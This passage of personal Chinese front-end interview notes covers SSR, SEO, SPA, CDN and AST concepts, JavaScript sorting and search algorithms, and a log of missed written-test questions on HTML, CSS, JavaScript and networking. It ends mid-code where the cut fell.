与之相对的是 CSR（Client Side Render），是一种目前流行的渲染方式，它依赖的是运行在客户端的JS，用户首次发送请求只能得到小部分的指引性HTML代码。第二次请求将会请求更多包含HTML字符串的JS文件。

![](https://tva1.sinaimg.cn/large/008i3skNgy1gy5drsmwr3j31400s8tbh.jpg)

> 总结

* 优点
  
  1. 更快的首屏渲染
     
     更快的响应时间，相对于客户端渲染，服务端渲染在浏览器请求URL之后已经得到了一个带有数据的HTML文本，浏览器只需要解析HTML，直接构建DOM树就可以。
  
  2. 利于`SEO`
     
     可以将 SEO 的关键信息直接在后台就渲染成 HTML，而保证搜索引擎的爬虫都能爬取到关键数据，然后在别人使用搜索引擎搜索相关的内容时，你的网页排行能靠得更前，这样你的流量就有越高。

* 缺点
  
  1. 服务端压力较大
  
  2. 一些常用的浏览器API可能无法正常使用（比如`window`、`docment`和`alert`等，如果使用的话需要对运行的环境加以判断）
  
  3. 开发调试会有一些麻烦（因为涉及了浏览器及服务器，对于SPA的一些组件的生命周期的管理会变得复杂）

[SSR 技术概述 - 掘金](https://juejin.cn/post/7002198277462442014)

[浅谈服务端渲染(SSR) - 简书](https://www.jianshu.com/p/10b6074d772c)

## 什么是SEO

> 搜索引擎工作原理

在搜索引擎网站的后台会有一个非常庞大的数据库，里面存储了海量的关键词，而每个关键词又对应着很多网址，这些网址是被称之为“搜索引擎蜘蛛”或“网络爬虫”程序从茫茫的互联网上一点一点下载收集而来的。随着各种各样网站的出现，这些勤劳的“蜘蛛”每天在互联网上爬行，从一个链接到另一个链接，下载其中的内容，进行分析提炼，找到其中的关键词，如果“蜘蛛”认为关键词在数据库中没有而对用户是有用的便存入后台的数据库中。反之，如果“蜘蛛”认为是垃圾信息或不重复信息，就舍弃不要，继续爬行，寻找最新的、有用的信息保存起来提供用户搜索。当用户搜索时，就能检索出与关键字相关的网址显示给访客。

一个关键词对用多个网址，因此就出现了排序的问题，相应的当与关键词最吻合的网址就会排在前面了。在“蜘蛛”抓取网页内容，提炼关键词的这个过程中，就存在一个问题：“蜘蛛”能否看懂。如果网站内容是flash和js等，那么它是看不懂的，会犯迷糊，即使关键字再贴切也没用。相应的，如果网站内容可以被搜索引擎能识别，那么搜索引擎就会提高该网站的权重，增加对该网站的友好度。这样一个过程我们称之为SEO。

> SEO简介

SEO(Search Engine Optimization)，即搜索引擎优化。SEO是随着搜索引擎的出现而来的，两者是相互促进，互利共生的关系。SEO的存在就是为了提升网页在搜索引擎自然搜索结果中的收录数量以及排序位置而做的优化行为。而优化的目的就是<mark>为了提升网站在搜索引擎中的权重，</mark><mark>增加对搜索引擎的友好度，使得用户在访问网站时能排在前面。</mark>

> SEO规范

* 网站结构布局优化：尽量简单、开门见山，提倡扁平化结构
  
  一般而言，建立的网站结构层次越少，越容易被“蜘蛛”抓取，也就容易被收录。一般中小型网站目录结构超过三级，“蜘蛛”便不愿意往下爬了。并且根据相关数据调查：如果访客经过跳转3次还没找到需要的信息，很可能离开。因此，三层目录结构也是体验的需要。为此我们需要做到：
  
  1. 控制首页链接数量
  
  2. 扁平化的目录层次（尽量在3层）
  
  3. 导航优化（例如面包屑）
  
  4. 利用布局，将重要内容HTML代码放在最前
  
  5. 控制页面大小，加少http请求

* 网页代码优化
  
  1. 突出重要内容---合理的设计title、description和keywords
  
  2. 语义化书写HTML代码，符合W3C标准
  
  3. 使用`alt`属性加以说明
  
  4. 等等（更多参看链接文章）

[前端SEO优化 - 掘金](https://juejin.cn/post/6844903824428105735)

[一个前端知道的 SEO - 掘金](https://juejin.cn/post/6844904029923835911)

## 什么是SPA?和MAP区别?SPA的优缺点?

SPA是指单页面应用, 必要的代码都通过单个页面的加载而检索, 根据需要动态的装载适当的资源添加到页面中, 页面在任何时候都不会重新加载. 举个例子来讲就是一个杯子，早上装的牛奶，中午装的是开水，晚上装的是茶，我们发现，变的始终是杯子里的内容

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1a5077xvjj20gt08mdg1.jpg)

而MAP是指多页面应用, 每一个页面都是一个主页面, 当访问每一个页面时, 都需要重新加载 html、js、css 文件

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1a50fdzulj20go089q36.jpg)

> SPA和MAP区别

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1a51owowdj216w0nctce.jpg)

> SPA优缺点

优点: 

1. 具有桌面应用的即时性、网站的可移植性和可访问性

2. 用户体验好, 内容改变不影响整个页面

3. 良好的前后端分离, 分工明确

缺点: 

2. 不利于搜索引擎的抓取

3. 首次渲染速度相对较慢

## SPA首屏优化方式

1. SSR(服务端渲染, 直接返回组装好的html进行渲染)

2. UI框架按需引入

3. 开启Gzip压缩(无损压缩)

4. 静态资源本地缓存

5. 减小入口文件体积

6. 图片资源压缩

## 什么是CDN

> CDN的全称是Content Delivery Network，即内容分发网络。由于CDN是为加快网络访问速度而被优化的网络覆盖层，因此被形象地称为“网络加速器”。

### CDN简介

**实现方法：** 通过在网络各处放置**节点服务器**所构成的在现有的互联网基础之上的一层**智能虚拟网络**，CDN系统能够实时地根据网络流量和各节点的**连接和负载**状况以及到用户的**距离**和**响应时间**等综合信息将用户的请求重新**导向离用户最近的服务节点**上，加快访问速度。

<mark>原理</mark>：广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。

**目的：** 使用户可`就近`取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的`响应速度`。

### CDN工作流程

> 不使用CDN：

- 用户在自己的浏览器中输入要访问的网站域名。

- 浏览器向 本地DNS服务器 请求对该域名的解析。

- 本地DNS服务器中如果缓存有这个域名的解析结果，则直接响应用户的解析请求。

- 本地DNS服务器中如果没有关于这个域名的解析结果的缓存，则以递归方式向整个DNS系统请求解析，获得应答后将结果反馈给浏览器。

- 浏览器得到域名解析结果，就是该域名相应的服务设备的 IP地址 。

- 浏览器向服务器请求内容。

- 服务器将用户请求内容传送给浏览器。

![](https://tva1.sinaimg.cn/large/008i3skNgy1gy61qfj4bfj31760u0abh.jpg)

> <mark>使用CDN：</mark>

- 当用户点击网站页面上的内容URL，经过**本地**DNS系统解析，DNS 系统会最终将域名的解析权交给 `CNAME` 指向的 CDN 专用 DNS 服务器。
- CDN 的 DNS 服务器将 CDN 的**全局负载均衡设备** `IP` 地址返回用户。
- 用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求。
- CDN 全局负载均衡设备根据用户 IP 地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。
- 基于以下这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的IP地址：
  - 根据用户 IP 地址，判断哪一台服务器距用户最近；
  - 根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；
  - 查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。
- 全局负载均衡设备把服务器的 IP 地址返回给用户。
- 用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1a79fwk3bj211k0u0jv4.jpg)

![](https://tva1.sinaimg.cn/large/008i3skNgy1gy61qruacyj31300omjsi.jpg)

### CDN的作用

1. 加速访问

2. 实现跨运营商、跨地域的全网覆盖

3. 保障你的网站安全（CDN的负载均衡和分布式存储技术，可以加强网站的可靠性）

4. 异地备援（当某个服务器发生意外故障时，系统将会调用其他临近的健康服务器节点进行服务）

5. 节约成本

6. 让你更专注业务本身

## 什么是AST（抽象语法树）

### 什么是AST

> 抽象语法树 (Abstract Syntax Tree)，简称 AST，它是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构。

在 JS 的世界中，我们可以认为 AST 是最底层，再往下，就是关于转换和编译的“黑魔法”领域了。

### AST如何生成

1. 读取 js 文件中的字符流，然后通过词法分析生成 `token`

2. 通过语法分析( Parser )生成 AST，最后生成机器码执行

### 词法分析

词法分析，也称之为扫描（scanner），简单来说就是调用 next() 方法，一个一个字母的来读取字符，然后与定义好的 JavaScript 关键字符做比较，生成对应的Token。Token 是一个不可分割的最小单元:

> 例如 var 这三个字符，它只能作为一个整体，语义上不能再被分解，因此它是一个 Token。

词法分析器里，每个关键字是一个 Token ，每个标识符是一个 Token，每个操作符是一个 Token，每个标点符号也都是一个 Token。除此之外，还会过滤掉源程序中的注释和空白字符（换行符、空格、制表符等。

### 语法分析

语法分析会将词法分析出来的 Token 转化成有语法含义的抽象语法树结构。同时，验证语法，语法如果有错的话，抛出语法错误。

### 举例

> 第一个例子

```js
const fn = a => a;
```

![](https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/31/16f579f319f2ef0e~tplv-t2oaga2asx-watermark.awebp)

用人话翻译这个图就是：用类型 const 声明变量 fn 指向一个箭头函数表达式，它的参数是 a ，函数体也是 a。

> 第二个例子

```js
const fn = a => {
    let i = 1;
  return a + i;
};
```

![](https://tva1.sinaimg.cn/large/008i3skNgy1gy752lvs1aj30oi1fy0w9.jpg)

[AST Explorer 网站](https://astexplorer.net/)

# 算法

## 冒泡排序

> 描述：就像水冒泡一样，每冒泡一次就将最大的元素冒泡到数组末尾，这样冒泡`len - 1`次，就可以得到一个排序后的数组

```js
/* 
    冒泡排序
*/
let arr = [11, 4, 5, 8, 2];

function foo(array) {
    // 第一层执行次数
    for(let i = 0; i < array.length - 1; i++) {
        // 第二层进行冒泡
        for(let j = 0; j < array.length - 1; j++) {
            if(array[j] > array[j + 1]) {
                let tmp = array[j];
                array[j] = array[j + 1];
                array[j + 1] = tmp;
            }
        }
    }
    return array;
}

let res = foo(arr);
console.log(res);  // [2, 4, 5, 8, 11]
```

现在第二层的循环，是每一次都从第一个比较到最后一个，其实我们发现，每次我们都会将最大的一个元素冒泡到数组的末尾，所以可以在第二次循环时，只从0开始，比较到前面的已经排为最大的元素的前面即可

```js
/* 
    冒泡排序
*/
let arr = [11, 4, 5, 8, 2];

function foo(array) {
    // 第一层执行次数
    for(let i = 0; i < array.length - 1; i++) {
        // 第二层进行冒泡(改动就是这里 -i )
        for(let j = 0; j < array.length - 1 - i; j++) {
            if(array[j] > array[j + 1]) {
                let tmp = array[j];
                array[j] = array[j + 1];
                array[j + 1] = tmp;
            }
        }
    }
    return array;
}

let res = foo(arr);
console.log(res);  // [2, 4, 5, 8, 11]
```

## 选择排序

> 描述：从数组的头部开始，比较当前元素与后面的元素，将最小的元素换置前面，这样执行`len - 1`次

```js
let arr = [11, 4, 5, 8, 2];

function bar(array) {
    let len = array.length;
    for(let i = 0; i < len - 1; i++) {
        // 比较元素大小，将最小的元素移至下标 i 处
        for(let j = i + 1; j < len; j++) {
            if(array[i] > array[j]) {
                let tmp = array[i];
                array[i] = array[j];
                array[j] = tmp;
            }
        }
    }
    return array;
}

let res = bar(arr);
console.log(res);
```

因为在内层循环会频繁的交换元素，可以稍作改动，让我的内层循环遍历记录最小元素的下标索引即可，内层循环结束后，再进行交换元素

```js
let arr = [11, 4, 5, 8, 2];

function bar(array) {
    let len = array.length;
    for(let i = 0; i < len - 1; i++) {
        // 记录本次遍历元素的最小值索引
        let minValIndex = i;
        for(let j = i + 1; j < len; j++) {
            if(array[minValIndex] > array[j]) {
                minValIndex = j;
            }
        }
        // 交换一次即可
        let tmp = array[i];
        array[i] = array[minValIndex];
        array[minValIndex] = tmp;
    }
    return array;
}

let res = bar(arr);
console.log(res);
```

## 插入排序

> 描述：从未排序的位置开始（第二个位置），将当前元素设为比较值，从他的前一个往前遍历，如果前面的元素比比较值大，就将该元素往后移一位，最后找到比比较值小的元素，将比较值放在这个小的元素的后面即可。

```js
/* 
    插入排序
*/
let arr = [11, 4, 5, 8, 2];

function foo(array) {
    for(let i = 1; i < array.length; i++) {
        // 记录要比较的值
        let compareVal = array[i];
        // 记录要比较值的前一个元素下标索引
        let j = i - 1;
        // 用 compareVal 依次从下标 j 比较到下标 0
        while(j >= 0 && array[j] > compareVal) {
            // 当前下标 j 元素如果大于比较值，就将下标 j 元素往后移动
            array[j + 1] = array[j];
            j--;
        }
        // 最后将比较值放在小于它的后一位置
        // j 下标最后记录的是比比较值小的元素的下标
        array[j + 1] = compareVal;
    }    
    return array;
}

let res = foo(arr);
console.log(res);
```

## 快速排序

> （1）在数据集之中，选择一个元素作为"基准"（pivot）。
> 
> （2）所有小于"基准"的元素，都移到"基准"的左边；所有大于"基准"的元素，都移到"基准"的右边。
> 
> （3）对"基准"左边和右边的两个子集，不断重复第一步和第二步，直到所有子集只剩下一个元素为止。

```js
/* 
    快速排序
*/
let arr = [11, 4, 5, 8, 2];

function quickSort(array) {
    // 终止条件
    if(array.length <= 1) return array;

    // 记录基准数 povit
    let povitIndex = Math.floor(array.length / 2);
    let povit = array.splice(povitIndex, 1)[0];

    // 声明两个数组，分别存放小于基准数的数和大于基准数的数
    let left = [],
        right = [];

    // 遍历数组，将对应的数存入数组中
    for(let item of array) {
        if(item > povit) {
            right.push(item);
        }else {
            left.push(item);
        }
    }

    // 再递归遍历基准数的左右数组
    return quickSort(left).concat(povit, quickSort(right));
}

let res = quickSort(arr);
console.log(res);
```

## 顺序搜索

搜索效率最低的搜索

```js
let arr = [11, 6, 2, 23, 34, 13];

function search(array, target) {
    for(let i = 0; i < array.length; i++) {
        if(array[i] == target) {
            return i;
        }
    }
    return -1;
}

console.log(search(arr, 8));  // -1
console.log(search(arr, 6));  // 1
console.log(search(arr, 2));  // 2
```

## 二分搜索

首先数组需要是有序数组！！

```js
/* 
    二分查找：首先数组需要排序
*/
let arr = [2, 6, 11, 13, 23, 34];

function binarySearch(array, target) {
    let left = 0, 
    right = array.length - 1;
    while(left <= right) {
        let mid = Math.floor((left + right) / 2);
        if(target > array[mid]) {
            left = mid + 1;
        }else if(target < array[mid]) {
            right = mid - 1;
        }else {
            return mid;
        }
    }
    return -1;
}

console.log(binarySearch(arr, 6));  // 1
console.log(binarySearch(arr, 23));  // 4
console.log(binarySearch(arr, 22));  // -1
```

## 回溯算法总结

> 回溯三部曲

1. 递归函数的返回值与参数

2. 回溯函数的终止条件

3. 单层搜索的过程（回溯法的搜索过程就是一个树型结构的遍历过程，for循环用来横向遍历，递归的过程是纵向遍历）

4. 剪枝

> 函数模版

```js
void backtracking(参数) {
    if（剪枝条件）return;

    if (终止条件) {
        存放结果;
        return;
    }

    for (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) {
        处理节点;
        backtracking(路径，选择列表); // 递归
        回溯，撤销处理结果
    }
}
```

> <mark>总结</mark>

1. 涉及到剪去同层重复元素时，需要先排序数组，然后进行操作！

2. 常见的全排列问题，我们可以借助 used（记录使用过的元素数组）进行求解！

## 深度优先搜索算法（DFS）

需要非常熟悉的前、中、后序遍历的过程

这样的题，往往分两种：

1. 直接在遍历的过程中操作
   
   举例子：[二叉搜索树的最小绝对差](https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/)
   
   ```js
   /**
    * @param {TreeNode} root
    * @return {number}
    */
   var getMinimumDifference = function(root) {
       // 记录指向前一个结点的指针
       let pre = null;
       // 记录最小差值
       let minDiff = Infinity;
       dfs(root);
       return minDiff;
   
       function dfs(node) {
           if(!node) return node;
   
           dfs(node.left);
           if(pre == null) {
               pre = node;
           }else {
               let dif = Math.abs(node.val - pre.val);
               if(dif < minDiff) {
                   minDiff = dif;
               }
               pre = node;
           }
           dfs(node.right);
       }
   };
   ```

2. 递归有返回值，再操作
   
   举例子：[二叉树的最近公共祖先](https://leetcode-cn.com/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof/)
   
   ```js
   /**
    * @param {TreeNode} root
    * @param {TreeNode} p
    * @param {TreeNode} q
    * @return {TreeNode}
    */
   var lowestCommonAncestor = function(root, p, q) {
       if(!root || root == p || root == q) return root;
       let left = lowestCommonAncestor(root.left, p, q);
       let right = lowestCommonAncestor(root.right, p, q);
       if(left && right) return root;
       if(left) return left;
       if(right) return right;
   };
   ```

## 双指针总结

1. 左右指针（一般数组中可以使用，将两个指针分别置于数组的开头和末尾，然后操作）
   
   代表题目：
   
   * [剑指 Offer 21. 调整数组顺序使奇数位于偶数前面](https://leetcode-cn.com/problems/diao-zheng-shu-zu-shun-xu-shi-qi-shu-wei-yu-ou-shu-qian-mian-lcof/)
   
   * [剑指 Offer 57. 和为s的两个数字](https://leetcode-cn.com/problems/he-wei-sde-liang-ge-shu-zi-lcof/)
   
   * [143. 重排链表](https://leetcode-cn.com/problems/reorder-list/)（这题就是先把链表存为数组，然后左右指针）

2. 快慢指针（分两种）
   
   * 一种是slow跑的慢（一次走一步），fast跑的快（一次走两步）
     
     * 一般在涉及<mark>环形</mark>的题目时，会用到
     
     举例子：
     
     1. [141. 环形链表](https://leetcode-cn.com/problems/linked-list-cycle/)
     
     2. [142. 环形链表 II](https://leetcode-cn.com/problems/linked-list-cycle-ii/)
   
   * 一种是fast先跑几步，然后同时走
     
     * 一般在寻在倒数的节点时可用
     
     举例子：[19. 删除链表的倒数第 N 个结点](https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/)

3. 面对链表的题型时，如果涉及的想法很接近但是有漏洞时，不妨考虑下是否需要一个虚拟节点
   
   举例涉及虚拟节点的题目：
   
   1. [剑指 Offer 25. 合并两个排序的链表](https://leetcode-cn.com/problems/he-bing-liang-ge-pai-xu-de-lian-biao-lcof/)
   
   2. [19. 删除链表的倒数第 N 个结点](https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/)
   
   3. [86. 分隔链表](https://leetcode-cn.com/problems/partition-list/)

# 笔试错题记录

## 下列哪些方法可以产生可输入文本区

```html
1. <div contenteditable></div>   <!-- 注意这个! -->
2. <textarea></textarea>
3. <input />
```

## 下列哪个是用于 aira 无障碍属性的

```html
1. <div id="percent-loaded" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100" />
2. <div role="radio" aria-checked="true" aria-label="单选2" tabindex="0">单选tabindex="0"</div>
```

所以是`role 属性`

## 以下哪些方法可以用来解决 JS 异步问题

1. promise
2. callback   ⚠️
3. async

## 下面哪种写法是正确的

```js
1. console.log(1); import foo from './foo.js'; console.log(foo);   ❌ 
2. import('./foo.js').then(foo => { console.log(foo) });    ✅
3. if(Math.random() > 0.5) { import foo from './foo.js' }    ❌
4. import foo from './foo.js'; console.log(fool);    ✅
```

## 下列哪些属性的变化会导致重排

1. visibility  ❌
2. height  ✅
3. width  ✅
4. border  ✅  ⚠️

> 引起重绘

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0e0zw1tsnj215s0hogns.jpg)

> 引起重排 (回流)

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0e1260dkpj214n0u0whu.jpg)

参考: [CSS重绘和重排(回流) - 一梦梦 - 博客园](https://www.cnblogs.com/mdr86553/p/12048742.html)

## 在邮件服务中IMAP协议用于接收邮件,IMAP建立连接时使用的协议与端口为

`tcp协议与143端口`

## postion 属性有那些值

```css
static | relative | absolute | sticky | fixed
```

## 在服务器端配置web服务时,可以支持web服务的平台有

`nginx、apache、IIS(✅)`

## CSS 伪类有哪些

> `:link、:visited、:hover、:active、:focus、:lang()、:not()、:root、:first-child、:last-child、:empty 等等`

## CSS 位元素有哪些

* `::first-letter`，将特殊的样式添加到文本的首字母。  

* `::first-line`，将特殊的样式添加到文本的首行。  

* `::before`，在某元素之前插入某些内容。  

* `::after`，在某元素之后插入某些内容。

## 下列哪些写法可以新窗口打开链接

```html
1. <a href="http://75.team" target="_blank">
2. <a href="http://75.team" target="new">     🌿
```

## `<button>` 标签默认的 type 属性值为

`submit`

## `<button>`标签的 type 属性值有

```html
1. <button type="submit"></button>  <!-- 默认 -->
2. <button type="button"></button>
3. <button type="menu"></button>
4. <button type="reset"></button>
```

## `<input>` 标签默认的 type 属性值为

`text`

## `<input>` 标签的 type 属性值有

> `text`、`button`、`checkbox`、`color`、`date`、`datetime`、`hidden`、`file`、`number`、`password`、`submit`、`search`、`radio` 等等

## 哪一个元素用于使HTML中表格里的单元格在同行进行合并

`colspan`

> 对于同一列合并: `rowspan`

参考: [html表格标签中如何合并行和单元格-百度经验](https://jingyan.baidu.com/article/3d69c551a511d4b1ce02d73c.html)

## 一个宽度100px，高度50px的父级盒子，如果子盒子 padding-top 的值为 20%，那子盒子的 padding-top 为多少像素

`20px`

解释:  padding-top的百分比值参考对象是`父级元素的宽度`

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .father {
            width: 100px;
            height: 50px;
            background-color: burlywood;
        }

        .father .son {
            background: cadetblue;
            padding-top: 20%;
        }
    </style>
</head>
<body>
    <div class="father">
        <div class="son"></div>
    </div>
</body>

</html>
```

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0e3nb0ludj20m00cygly.jpg)

## 下面返回 true 的是

```js
1. NaN === NaN   false  🌿
2. !!''          false  🌿
3. !![]          true   🌿
```

## 以下哪个元素不属于嵌入式内容(embedded content)？

1. img        属于

2. svg         属于

3. `script`     不属于

4. math     属于

> 用于嵌入各种类型内容的元素还包括：[`<audio>`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio), [`<canvas>`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/canvas), [`<iframe>`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe), [`<img>`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img), `<math>`, [`<object>`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/object), [`<svg>`](https://developer.mozilla.org/zh-CN/docs/Web/SVG/Element/svg) 和 [`<video>`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video)

参考: [&lt;embed&gt;：外部内容嵌入元素 - HTML（超文本标记语言） | MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/embed)

## 序列{9,12,17,30,50,20,60,65,4,19}构造为堆后，堆所对应的的中序遍历序列可能为（）

1. 65,12,30,50,9,19,20,4,17,60

2. 65,12,30,9,50,19,4,20,17,60   ✅

3. 65,9,30,12,19,50,4,20,17,60

4. 65,12,9,30,50,4,20,9,17,60

思路: 先找到其小顶堆和大顶堆, 然后再进行中序遍历, 比对结果

参考: [堆（大顶堆，小顶堆），中序遍历，前序遍历，后续遍历序列 - NOT_COPY - 博客园](https://www.cnblogs.com/mww-NOTCOPY/p/12357402.html)

## 下面程序的时间复杂度为多少

```cpp
int i,j,a;
for(i=1;i<n.i++)
{
   for(j=1;j<n;j*=2)   // 注意这里是j*=2
   {
       a = i+j;
       cout<<a<<endl;
    }
}
```

答案: O(n*log2(n))

## 数据结构中，如果存在二维数组Q，Q的行下标取值为2-5，Q的列下标取值为1-8，对于Q中的元素用相邻的6个字节存储，存储器按字节编址，数组Q的字节为（）

我一开始的做法 `4 * 8 * 6 = 192`

答案: 204

可能比较正确的解释:

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0gd6ec6mnj20wm0ec75x.jpg)

参考: [登录—专业IT笔试面试备考平台_牛客网](https://www.nowcoder.com/test/question/done?tid=53947970&qid=806057#summary)

## HTML5新增的表单元素不包括

A. password；

B. color；

C. date；

D. number;

答案: A

> HTML5新增表单内容
> 
> * 新增表单控：color ,  calendar  ,  date ,  datetime, datetime-local,  time, mouth , week, email, url , search,range, tel
> 
> * 新增的表单元素： datalist ， keygen， output

## 关于HTML的描述，不推荐的是

A. 在页面顶部必须加入DOCTYPE声明；

B. 尽量将js引用放到HTML页面底部；

C. 可以使用center标签来设置元素居中；

D. 使用table标签来处理数据相关的展示；

答案选: C

## 在面向对象技术中，多态性是指（）

`针对一消息，不同对象可以以适合自身的方式加以响应`

来源: [登录—专业IT笔试面试备考平台_牛客网](https://www.nowcoder.com/test/question/done?tid=53947970&qid=806067#summary)

## `'\\\\\\'`.replace(new RegExp(`'\\\\\\\\'`, 'gi'), '/') 的执行结果是？

`/\`

解释: 

在字符串里面， 字符串\ 是需要进行转义的，所以字符串\得写为'\\'

在正则表达式中，正则表达式\也是需要进行转义的，所以正则表达式表达式\得写为/\\/

所以，题目得意思是：

在字符串\\\中全局匹配，忽略大小写，把匹配到的字符串\\换成字符串/

```js
var a = '\\\\\\';
var b = '\\\\\\\\';
console.log(a);  // 打印: \\\
console.log(b);  // 打印: \\\\
var reg = new RegExp(b, 'gi');
console.log(reg);  // 打印: /\\\\/gi  (//里面的斜杠又是需要'\'来转译的)
let res = a.replace(reg, '/');
console.log(res);  // 打印: /\

var reg2 = /\\\\\\\\/gi;  
console.log(reg2); // 打印: /\\\\\\\\/gi
```

来源: [登录—专业IT笔试面试备考平台_牛客网](https://www.nowcoder.com/test/question/done?tid=53947970&qid=806069#summary)

## 根据如下代码，set.size的值为

```js
var set = new Set([0, 2, 2, 0, 0, 5, 9, {}, {}, NaN, NaN]);
```

答案为: 7

⚠️: 这里的两个NaN在set中会判定为相同,所以会去掉一个

tips: 

```js
NaN === NaN   // false
```

## 执行下列语句后， 变量name的值为

```js
function Person() {};
var person1 = new Person();
var person2 = new Person();
Person.prototype.getName = function () {
    return this.name;
};
Person.prototype.name = 'tom';
person1.name = 'jerry';
var name = person2.getName();


// 答案:
console.log(name);  // tom
```

我一开始选的 `undefined`

## 执行下列语句后，变量name1的值为

```js
var name = 'tom';
function getMethod() {
    var result = function () {
        return name;
    };
    var name = 'jerry';
    return result;
}
var getName = getMethod();
var name1 = getName();

// 答案:
console.log(name1);  // jerry
```

我一开始选的 `undefined`

## 面向对象程序设计方法的优点包含：

`可重用性、可扩展性、易于管理和维护(🌿)`

## 关于 node.js 中的模块化规范，以下说法正确的有哪些？

1. require 加载模块是一个同步的过程

2. require 函数可以在代码的任意位置执行   ⚠️

3. exports 或 module.exports 其中一个一旦重新赋值，exports 将失效

## 下面选项中属于Node定时器的是？

1. `setTimeout()`

2. `setInterval()`

3. `setImmediate()`

4. `process.nextTick()`

## 以下代码能在不同环境下（不考虑兼容性问题）正确判断变量a = [] 是数组的有：

1. a instanceof Array        ❌    ⚠️

2. Array.isArray(a)             ✅

3. Object.prototype.toString.call(a) === '[object Array]'    ✅  ⚠️

4. typeof a === 'array'      ❌

对于第一个选项的解释: 

> instanceof操作符的问题在于，它假定只有一个全局环境。如果网页中包含多个框架，那实际上就存在两个以上不同的全局执行环境，从而存在两个以上不同版本的Array构造函数。 
> 如果你从一个框架向另一个框架传入一个数组，那么传入的数组与在第二个框架中原生创建的数组分别具有各自不同的构造函数。

```js
var iframe = document.createElement('iframe');
document.body.appendChild(iframe);

var arr = [1, 2, 3];
xArray = window.frames[0].Array; //iframe中的构造函数
var arrx = new xArray(4, 5, 6);

console.log(arrx instanceof Array); //false
console.log(arrx.constructor == Array); // false

console.log(Array.prototype == xArray.prototype); //false
console.log(arr instanceof xArray); //false

console.log(arrx.constructor === Array); // false
console.log(arr.constructor === Array); // true
console.log(arrx.constructor === xArray); // true
console.log(Array.isArray(arrx)); //true
```

## 关于同源策略和跨域的问题，以下说法正确的有？

1. `http://store.company.com/dir/page.html` 和`http://store.company.com/dir/other.html` 不同源。   ❌

2. node设置res.header("Access-Control-Allow-Origin", "*") 去解决跨域问题，会有安全问题。      ✅

3. JSONP的原理是利用引入script不限制源的特点，把处理函数名作为参数传入，然后返回执行语句。       ✅  ⚠️

4. document.domain的原理是将两个页面的document.domain设置成一致，只能解决主域相同的跨域问题。     ✅

## 下列在 JS 事件循环机制中属于微任务（microTask）的是？

1. process.nextTick    ✅ ⚠️

2. promise    ✅

3. setTimeout    ❌

4. setInterval   ❌

## 假如图片的地址为imgUrl,下面哪行代码在网页中打开可以直接看到的是文字“hello”

```html
1. <img src=“” title=“hello”>   🌿
2. <img src=“” alt=“hello”>
```

## 下列选项中，关于HTTP与HTTPS的区别的描述中，正确的是（   ）：

1. http是超文本传输协议，信息是明文传输。https则是具有安全性的ssl加密传输协议。 ✅

2. http和https使用的是完全不同的连接方式，用的端口也不一样。 ✅  ⚠️

3. http的连接很简单，是无状态的。HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。   ✅

4. http默认使用80端口，https默认使用403端口。  ❌ (https端口为443)

## 小牛开发文件上传功能时，遇到了一些安全问题，那么对于文件上传漏洞，有效防御手段有哪些？

1. 浏览器端限制文件扩展名  ❌

2. 服务器端限制文件扩展名   ✅  ⚠️

3. 将上传的文件存储在静态文件服务器中  ✅

4. 验证Content-Type   ❌

## 设a数组的长度为N,那么下面程序循环内交换数组元素的代码执行的时间复杂度最坏为?

```js
for (int i = N - 1; i > 1; i--)
{
    for (int j = 1; j < i; j++)
    {
        if (a[j] > a[j + 1])
        {
            temp = a[j + 1];
            a[j + 1] = a[j];
            a[j] = temp;
        }
    }
}
```

这段程序就是选择排序

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0ha5e87muj20u00katak.jpg)

## 如果存储结构由数组变为链表，那么下列哪些算法的时间复杂度量级会升高

1. 选择排序

2. 希尔排序  ✅

3. 堆排序  ✅

4. 插入排序   ⚠️

## linux下可以查看网卡流量情况的是

`nload`  

## 下面代码的输出是：

```js
// 下面代码的输出是：
function func(source) {
    var target = {};
    for (var key in source) {
        if (Object.prototype.hasOwnProperty.call(source, key)) {
            if (typeof source[key] === 'object') {
                target[key] = func(source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
    return target;
}
var a = {
    a1: "a1",
    a2: {
